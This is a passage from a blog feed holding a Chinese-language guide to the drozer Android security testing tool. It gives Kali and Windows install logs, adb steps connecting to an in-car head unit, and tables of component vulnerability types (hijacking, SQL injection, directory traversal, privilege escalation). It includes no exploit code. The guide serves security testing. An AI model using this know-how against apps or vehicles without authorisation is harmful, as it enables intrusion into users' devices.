href="https://www.jianshu.com/p/5459c653b34a">https://www.jianshu.com/p/5459c653b34a</a><br><a href="https://www.jianshu.com/p/ea8bc4aaf057">https://www.jianshu.com/p/ea8bc4aaf057</a><br><a href="https://www.jianshu.com/p/32938446e4e0">https://www.jianshu.com/p/32938446e4e0</a><br><a href="https://www.jianshu.com/p/ca3d87a4cdf3">https://www.jianshu.com/p/ca3d87a4cdf3</a><br><a href="https://www.jianshu.com/p/d963c55c3ab9">https://www.jianshu.com/p/d963c55c3ab9</a><br><a href="https://blog.csdn.net/qian1127/article/details/103531761">https://blog.csdn.net/qian1127/article/details/103531761</a><br><a href="https://www.cnblogs.com/Gandy/p/7290069.html">https://www.cnblogs.com/Gandy/p/7290069.html</a><br><a href="https://www.cnblogs.com/rebeyond/p/10916076.html">https://www.cnblogs.com/rebeyond/p/10916076.html</a><br><a href="https://blog.csdn.net/whnyao1314/article/details/83007498">https://blog.csdn.net/whnyao1314/article/details/83007498</a></p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Drozer指北</title>
    <link href="/2024/01/27/Drozer/"/>
    <url>/2024/01/27/Drozer/</url>
    
    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(g0at㉿kali)-[~/Desktop]<br>└─$ wget https://github.com/FSecureLABS/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl<br>      <br>      <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ sudo apt-get <span class="hljs-comment">#assume-yes install python-pip                         </span><br>    <br>    <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ pip2 install wheel<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.</span><br>Defaulting to user installation because normal site-packages is not writeable<br>Requirement already satisfied: wheel <span class="hljs-keyword">in</span> /usr/local/lib/python2.7/dist-packages (0.37.1)<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ pip2 install pyyaml<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                    </span><br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting pyyaml<br>  Downloading PyYAML-5.4.1-cp27-cp27mu-manylinux1_x86_64.whl (574 kB)<br>     |████████████████████████████████| 574 kB 436 kB/s <br>Installing collected packages: pyyaml<br>Successfully installed pyyaml-5.4.1<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ pip2 install pyhamcrest<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                    </span><br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting pyhamcrest<br>  Downloading PyHamcrest-1.10.1.tar.gz (43 kB)<br>     |████████████████████████████████| 43 kB 252 kB/s <br>Collecting six<br>  Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)<br>Building wheels <span class="hljs-keyword">for</span> collected packages: pyhamcrest<br>  Building wheel <span class="hljs-keyword">for</span> pyhamcrest (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> pyhamcrest: filename=PyHamcrest-1.10.1-py2-none-any.whl size=48898 sha256=7d5493ff342fd5ea5ec10a6d8713f7519bfcf4cc98d1b101cb75039f15e76e43<br>  Stored <span class="hljs-keyword">in</span> directory: /home/g0at/.cache/pip/wheels/f5/8c/e2/f0cea19d340270166bbfd4a2e9d8b8c132e26ef7e1376a0890<br>Successfully built pyhamcrest<br>Installing collected packages: six, pyhamcrest<br>Successfully installed pyhamcrest-1.10.1 six-1.16.0<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ pip2 install protobuf<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                    </span><br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting protobuf<br>  Downloading protobuf-3.17.3-cp27-cp27mu-manylinux_2_5_x86_64.manylinux1_x86_64.whl (1.0 MB)<br>     |████████████████████████████████| 1.0 MB 349 kB/s <br>Requirement already satisfied: six&gt;=1.9 <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from protobuf) (1.16.0)<br>Installing collected packages: protobuf<br>Successfully installed protobuf-3.17.3<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ pip2 install pyopenssl<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                    </span><br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting pyopenssl<br>  Downloading pyOpenSSL-21.0.0-py2.py3-none-any.whl (55 kB)<br>     |████████████████████████████████| 55 kB 304 kB/s <br>Collecting cryptography&gt;=3.3<br>  Downloading cryptography-3.3.2-cp27-cp27mu-manylinux2010_x86_64.whl (2.6 MB)<br>     |████████████████████████████████| 2.6 MB 686 kB/s <br>Requirement already satisfied: six&gt;=1.5.2 <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from pyopenssl) (1.16.0)<br>Collecting cffi&gt;=1.12<br>  Downloading cffi-1.15.1-cp27-cp27mu-manylinux1_x86_64.whl (390 kB)<br>     |████████████████████████████████| 390 kB 4.8 MB/s <br>Collecting enum34; python_version &lt; <span class="hljs-string">&quot;3&quot;</span><br>  Downloading enum34-1.1.10-py2-none-any.whl (11 kB)<br>Collecting ipaddress; python_version &lt; <span class="hljs-string">&quot;3&quot;</span><br>  Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)<br>Collecting pycparser<br>  Downloading pycparser-2.21-py2.py3-none-any.whl (118 kB)<br>     |████████████████████████████████| 118 kB 18.2 MB/s <br>Installing collected packages: pycparser, cffi, enum34, ipaddress, cryptography, pyopenssl<br>Successfully installed cffi-1.15.1 cryptography-3.3.2 enum34-1.1.10 ipaddress-1.0.23 pycparser-2.21 pyopenssl-21.0.0<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ pip2 install twisted<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                    </span><br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting twisted<br>  Downloading Twisted-20.3.0-cp27-cp27mu-manylinux1_x86_64.whl (3.2 MB)<br>     |████████████████████████████████| 3.2 MB 396 kB/s <br>Collecting zope.interface&gt;=4.4.2<br>  Downloading zope.interface-5.5.2.tar.gz (300 kB)<br>     |████████████████████████████████| 300 kB 2.5 MB/s <br>Collecting attrs&gt;=19.2.0<br>  Downloading attrs-21.4.0-py2.py3-none-any.whl (60 kB)<br>     |████████████████████████████████| 60 kB 3.8 MB/s <br>Collecting hyperlink&gt;=17.1.1<br>  Downloading hyperlink-21.0.0-py2.py3-none-any.whl (74 kB)<br>     |████████████████████████████████| 74 kB 1.0 MB/s <br>Collecting constantly&gt;=15.1<br>  Downloading constantly-15.1.0-py2.py3-none-any.whl (7.9 kB)<br>Collecting Automat&gt;=0.3.0<br>  Downloading Automat-22.10.0-py2.py3-none-any.whl (26 kB)<br>Requirement already satisfied: PyHamcrest!=1.10.0,&gt;=1.9.0 <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from twisted) (1.10.1)<br>Collecting incremental&gt;=16.10.1<br>  Downloading incremental-22.10.0-py2.py3-none-any.whl (16 kB)<br>Requirement already satisfied: setuptools <span class="hljs-keyword">in</span> /usr/local/lib/python2.7/dist-packages (from zope.interface&gt;=4.4.2-&gt;twisted) (44.1.1)<br>Collecting idna&gt;=2.5<br>  Downloading idna-2.10-py2.py3-none-any.whl (58 kB)<br>     |████████████████████████████████| 58 kB 4.6 MB/s <br>Collecting typing; python_version &lt; <span class="hljs-string">&quot;3.5&quot;</span><br>  Downloading typing-3.10.0.0-py2-none-any.whl (26 kB)<br>Requirement already satisfied: six <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from Automat&gt;=0.3.0-&gt;twisted) (1.16.0)<br>Building wheels <span class="hljs-keyword">for</span> collected packages: zope.interface<br>  Building wheel <span class="hljs-keyword">for</span> zope.interface (setup.py) ... <span class="hljs-keyword">done</span><br>  Created wheel <span class="hljs-keyword">for</span> zope.interface: filename=zope.interface-5.5.2-cp27-cp27mu-linux_x86_64.whl size=198975 sha256=c18b24a79ba85066a8b982b2f624c23b285a56618aae08f309f200f02383a5f2<br>  Stored <span class="hljs-keyword">in</span> directory: /home/g0at/.cache/pip/wheels/8f/60/b0/736e361327f969f38ad9ee2e24132600a82fac63ab43b7082e<br>Successfully built zope.interface<br>Installing collected packages: zope.interface, attrs, idna, typing, hyperlink, constantly, Automat, incremental, twisted<br>  WARNING: The script automat-visualize is installed <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/home/g0at/.local/bin&#x27;</span> <span class="hljs-built_in">which</span> is not on PATH.<br>  Consider adding this directory to PATH or, <span class="hljs-keyword">if</span> you prefer to suppress this warning, use <span class="hljs-comment">#no-warn-script-location.                                                                                                </span><br>  WARNING: The scripts cftp, ckeygen, conch, mailmail, pyhtmlizer, tkconch, trial, twist and twistd are installed <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/home/g0at/.local/bin&#x27;</span> <span class="hljs-built_in">which</span> is not on PATH.<br>  Consider adding this directory to PATH or, <span class="hljs-keyword">if</span> you prefer to suppress this warning, use <span class="hljs-comment">#no-warn-script-location.                                                                                                </span><br>Successfully installed Automat-22.10.0 attrs-21.4.0 constantly-15.1.0 hyperlink-21.0.0 idna-2.10 incremental-22.10.0 twisted-20.3.0 typing-3.10.0.0 zope.interface-5.5.2<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ pip2 install service_identity<br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                    </span><br>Defaulting to user installation because normal site-packages is not writeable<br>Collecting service_identity<br>  Downloading service_identity-21.1.0-py2.py3-none-any.whl (12 kB)<br>Collecting pyasn1-modules<br>  Downloading pyasn1_modules-0.3.0-py2.py3-none-any.whl (181 kB)<br>     |████████████████████████████████| 181 kB 456 kB/s <br>Collecting pyasn1<br>  Downloading pyasn1-0.5.1-py2.py3-none-any.whl (84 kB)<br>     |████████████████████████████████| 84 kB 3.5 MB/s <br>Requirement already satisfied: cryptography <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from service_identity) (3.3.2)<br>Requirement already satisfied: six <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from service_identity) (1.16.0)<br>Requirement already satisfied: attrs&gt;=19.1.0 <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from service_identity) (21.4.0)<br>Requirement already satisfied: ipaddress; python_version &lt; <span class="hljs-string">&quot;3.3&quot;</span> <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from service_identity) (1.0.23)<br>Requirement already satisfied: cffi&gt;=1.12 <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from cryptography-&gt;service_identity) (1.15.1)<br>Requirement already satisfied: enum34; python_version &lt; <span class="hljs-string">&quot;3&quot;</span> <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from cryptography-&gt;service_identity) (1.1.10)<br>Requirement already satisfied: pycparser <span class="hljs-keyword">in</span> /home/g0at/.local/lib/python2.7/site-packages (from cffi&gt;=1.12-&gt;cryptography-&gt;service_identity) (2.21)<br>Installing collected packages: pyasn1, pyasn1-modules, service-identity<br>Successfully installed pyasn1-0.5.1 pyasn1-modules-0.3.0 service-identity-21.1.0<br>                                                                                                                                                                                                                                                                                                                                                                                                                                  <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ sudo apt-get install <span class="hljs-comment">#assume-yes openjdk-8-jdk-headless</span><br>正在读取软件包列表... 完成<br>正在分析软件包的依赖关系树... 完成<br>正在读取状态信息... 完成                 <br>E: 无法定位软件包 openjdk-8-jdk-headless<br>                                                                                                                                                                                                                                                                                                                                                                                                                                 <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ java -Version<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>Unrecognized option: -Version<br>Error: Could not create the Java Virtual Machine.<br>Error: A fatal exception has occurred. Program will <span class="hljs-built_in">exit</span>.<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ javac -version<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>javac 17.0.8<br>                                                                                                                                                                                                                                                                                                                                                                                                                                    <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ sudo pip2 install drozer-2.4.4-py2-none-any.whl         <br>DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support <span class="hljs-keyword">for</span> Python 2.7 <span class="hljs-keyword">in</span> January 2021. More details about Python 2 support <span class="hljs-keyword">in</span> pip can be found at https://pip.pypa.io/en/latest/development/release-process/<span class="hljs-comment">#python-2-support pip 21.0 will remove support for this functionality.                                    </span><br>Processing ./drozer-2.4.4-py2-none-any.whl<br>Collecting pyyaml&gt;=3.11<br>  Downloading PyYAML-5.4.1-cp27-cp27mu-manylinux1_x86_64.whl (574 kB)<br>     |████████████████████████████████| 574 kB 466 kB/s <br>Collecting protobuf&gt;=2.6.1<br>  Downloading protobuf-3.17.3-cp27-cp27mu-manylinux_2_5_x86_64.manylinux1_x86_64.whl (1.0 MB)<br>     |████████████████████████████████| 1.0 MB 6.3 MB/s <br>Collecting pyopenssl&gt;=16.2<br>  Downloading pyOpenSSL-21.0.0-py2.py3-none-any.whl (55 kB)<br>     |████████████████████████████████| 55 kB 2.2 MB/s <br>Collecting six&gt;=1.9<br>  Downloading six-1.16.0-py2.py3-none-any.whl (11 kB)<br>Collecting cryptography&gt;=3.3<br>  Downloading cryptography-3.3.2-cp27-cp27mu-manylinux2010_x86_64.whl (2.6 MB)<br>     |████████████████████████████████| 2.6 MB 2.3 MB/s <br>Collecting cffi&gt;=1.12<br>  Downloading cffi-1.15.1-cp27-cp27mu-manylinux1_x86_64.whl (390 kB)<br>     |████████████████████████████████| 390 kB 22.1 MB/s <br>Collecting enum34; python_version &lt; <span class="hljs-string">&quot;3&quot;</span><br>  Downloading enum34-1.1.10-py2-none-any.whl (11 kB)<br>Collecting ipaddress; python_version &lt; <span class="hljs-string">&quot;3&quot;</span><br>  Downloading ipaddress-1.0.23-py2.py3-none-any.whl (18 kB)<br>Collecting pycparser<br>  Downloading pycparser-2.21-py2.py3-none-any.whl (118 kB)<br>     |████████████████████████████████| 118 kB 9.4 MB/s <br>Installing collected packages: pyyaml, six, protobuf, pycparser, cffi, enum34, ipaddress, cryptography, pyopenssl, drozer<br>Successfully installed cffi-1.15.1 cryptography-3.3.2 drozer-2.4.4 enum34-1.1.10 ipaddress-1.0.23 protobuf-3.17.3 pycparser-2.21 pyopenssl-21.0.0 pyyaml-5.4.1 six-1.16.0<br>                                                                                                                                                                                                                   <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ drozer<br>usage: drozer [COMMAND]<br><br>Run `drozer [COMMAND] <span class="hljs-comment">#help` for more usage information.</span><br><br>Commands:<br>          console  start the drozer Console<br>           module  manage drozer modules<br>           server  start a drozer Server<br>              ssl  manage drozer SSL key material<br>          exploit  generate an exploit to deploy drozer<br>            agent  create custom drozer Agents<br>          payload  generate payloads to deploy droze<br><br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ adb install drozer-agent-2.3.4.apk   <span class="hljs-comment">#安装完APP后需要在Android侧打开drozer                       </span><br>Performing Streamed Install<br>Success<br>                                                                        <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ adb forward tcp:31415 tcp:31415   <span class="hljs-comment">#设置端口转发</span><br>31415<br>                                                                        <br>┌──(g0at㉿kali)-[~/Desktop]<br>└─$ drozer console connect         <span class="hljs-comment">#启动Drozer</span><br>/home/g0at/.local/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="hljs-keyword">for</span> it is now deprecated <span class="hljs-keyword">in</span> cryptography, and will be removed <span class="hljs-keyword">in</span> the next release.<br>  from cryptography import utils, x509<br>Selecting 2abfc75c6bf43736 (Qualcomm Zeekr DHU <span class="hljs-keyword">for</span> arm64 12)<br><br>            ..                    ..:.<br>           ..o..                  .r..<br>            ..a..  . ....... .  ..nd<br>              ro..idsnemesisand..pr<br>              .otectorandroidsneme.<br>           .,sisandprotectorandroids+.<br>         ..nemesisandprotectorandroidsn:.<br>        .emesisandprotectorandroidsnemes..<br>      ..isandp,..,rotectorandro,..,idsnem.<br>      .isisandp..rotectorandroid..snemisis.<br>      ,andprotectorandroidsnemisisandprotec.<br>     .torandroidsnemesisandprotectorandroid.<br>     .snemisisandprotectorandroidsnemesisan:<br>     .dprotectorandroidsnemesisandprotector.<br><br>drozer Console (v2.4.4)<br>dz&gt; <br><br></code></pre></td></tr></table></figure><p>报错及相应的解决方案：<a href="https://blog.csdn.net/Jession_Ding/article/details/82528142">https://blog.csdn.net/Jession_Ding/article/details/82528142</a></p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>在 Windows 下，安装环境必须为 Python 2.7，安装时选择自动添加环境变量，安装drozer时指定Python2安装路径，drozer 成功安装后，软件位于 Python 2.7 下的 Scripts 目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip2 install protobuf -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip2 install pyopenssl -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip2 install pyyaml -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip2 install twisted -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip2 install service_identity -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p>后面具体运行就和Linux一样了，更推荐在Linux下运行。</p><h3 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h3><p>具体测试流程不方便贴出来）</p><h4 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h4><table><thead><tr><th align="center">漏洞种类</th><th align="center">危害</th></tr></thead><tbody><tr><td align="center">越权绕过</td><td align="center">Activity 用户界面绕过会造成用户信息窃取</td></tr><tr><td align="center">拒绝服务</td><td align="center">通过 Intent 给 Activity 传输畸形数据使得程序崩溃从而影响用户体验</td></tr><tr><td align="center">Activity 劫持</td><td align="center">组件导出导致钓鱼欺诈，Activity 界面被劫持产生欺诈等安全事件</td></tr><tr><td align="center">隐式启动 Intent 包含敏感数据</td><td align="center">敏感信息泄露</td></tr></tbody></table><h4 id="Conten-Provider"><a href="#Conten-Provider" class="headerlink" title="Conten Provider"></a>Conten Provider</h4><p>数据共享组件，用于向其他组件乃至其他应用共享数据，所以该组件漏洞与数据相关。</p><table><thead><tr><th align="center"><strong>漏洞种类</strong></th><th align="center"><strong>危害</strong></th></tr></thead><tbody><tr><td align="center">信息泄露</td><td align="center">查看组件数据信息</td></tr><tr><td align="center">SQL注入</td><td align="center">注入获取相关数据</td></tr><tr><td align="center">目录遍历</td><td align="center">访问任意可读文件</td></tr></tbody></table><h4 id="Broadcast-Receiver"><a href="#Broadcast-Receiver" class="headerlink" title="Broadcast Receiver"></a>Broadcast Receiver</h4><table><thead><tr><th align="center"><strong>漏洞种类</strong></th><th align="center"><strong>危害</strong></th></tr></thead><tbody><tr><td align="center">敏感信息泄露</td><td align="center">发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</td></tr><tr><td align="center">权限绕过</td><td align="center">可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过<receiver>标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</receiver></td></tr><tr><td align="center">消息伪造</td><td align="center">暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</td></tr><tr><td align="center">拒绝服务</td><td align="center">如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。 拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</td></tr></tbody></table><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><p>Service(服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。</p><table><thead><tr><th align="center"><strong>漏洞种类</strong></th><th align="center"><strong>危害</strong></th></tr></thead><tbody><tr><td align="center">权限提升</td><td align="center">当一个service配置了intent-filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。</td></tr><tr><td align="center">service劫持</td><td align="center">隐式启动services,当存在同名services,先安装应用的services优先级高</td></tr><tr><td align="center">消息伪造</td><td 